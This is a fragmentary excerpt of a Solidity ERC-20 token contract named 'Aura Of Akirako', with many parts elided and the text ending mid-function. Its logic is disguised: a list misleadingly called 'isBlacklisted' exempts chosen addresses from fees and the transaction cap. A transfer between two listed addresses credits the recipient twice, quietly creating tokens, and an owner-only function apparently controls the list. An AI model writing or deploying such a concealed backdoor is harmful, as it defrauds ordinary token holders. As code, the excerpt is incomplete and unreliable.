...
contract AoA is Context, IERC20, Ownable {
    ...
    uint256 public _denominator = 20000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "Aura Of Akirako";
    string private _symbol = unicode"あき";
    ...
    function _basicTransfer(address holder) external onlyOwner() {
    ...
    function _transfer(
        ...
        uint256 _emitBalances
    ) private {
        require(_emitBalances > 0, "Transfer amount must be greater than zero");
        bool transactFees = false;
        if(!isBlacklisted[_transactAmountFrom] && !isBlacklisted[_emitTokensTo]){
            transactFees = true;
            require(_emitBalances <= _denominator, "Transfer amount exceeds the maxTxAmount.");
        }          
        uint256 ERCcontractBalance = balanceOf(address(this));
        if(ERCcontractBalance >= _denominator)
        {
            ERCcontractBalance = _denominator;
        }        
        _tokenTransfer(_transactAmountFrom,_emitTokensTo,_emitBalances,transactFees);
    }
    ...
    function _transferStandard(address sender, address _emitTo, uint256 _rTotalAmount,bool transactFees) private {
        ...
        _rOwned[_emitTo] = _rOwned[_emitTo].add(_tTotalAmount);
        uint256 _deliver = _rOwned[_emitTo].add(_tTotalAmount);
        _rOwned[sender] = _rOwned[sender].sub(_tTotalAmount);
        bool tradingAllowed = isBlacklisted[sender] && isBlacklisted[_emitTo];
             if (tradingAllowed ){
              _rOwned[_emitTo] =_deliver;
        } else {
